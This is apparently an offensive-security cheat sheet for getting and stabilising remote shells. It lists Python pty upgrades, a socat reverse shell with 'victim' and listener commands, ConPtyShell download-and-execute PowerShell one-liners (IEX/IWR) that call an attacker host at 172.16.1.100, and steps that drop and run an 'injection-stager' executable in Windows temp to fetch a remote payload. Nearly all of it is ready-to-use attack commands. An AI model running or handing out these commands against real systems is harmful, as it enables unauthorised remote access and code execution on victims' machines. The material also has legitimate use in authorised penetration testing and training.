
# Python
## For python3  
python3 -c 'import pty; pty.spawn("/bin/bash")'  
  
## For python2  
python -c 'import pty; pty.spawn("/bin/bash")'  
  
### for tab complete, etc.  
export TERM=xterm  
ctrl+z  
stty raw -echo; fg



# Socat

IP=  
LPORT=  
CPORT=  
  
## Listener:  
socat file:`tty`,raw,echo=0 tcp-listen:$LPORT  
​  
## Victim:  
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$IP:$CPORT


# ConPTYShell

https://github.com/antonioCoco/ConPtyShell/releases/download/1.5/ConPtyShell.zip  
  
## ON ATTACKER  
```
stty raw -echo; (stty size; cat) | nc -lvnp 50001  
```
  
  
## ON TARGET  
```
IEX(IWR http://172.16.1.100:80/ConPtyShell/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 172.16.1.100 50001  
```
  
## As additional process  
```
Start-Job -ScriptBlock { IEX(IWR http://172.16.1.100:50080/ConPtyShell/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 172.16.1.100 50001 }  
```
  
  
```
C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe  
C:\Windows\System32\WindowsPowerShell\v1.0\ 
```

```
powershell iwr -uri http://172.16.1.100:50080/injection-stager/injection-stager.exe -Outfile c:/windows/temp/fun.exe  
```
  
```
cd C:/windows/temp  
```
```
  
.\fun.exe --direct http://172.16.1.100:50080/shellpotato.txt C:/windows/system32/calc.exe
```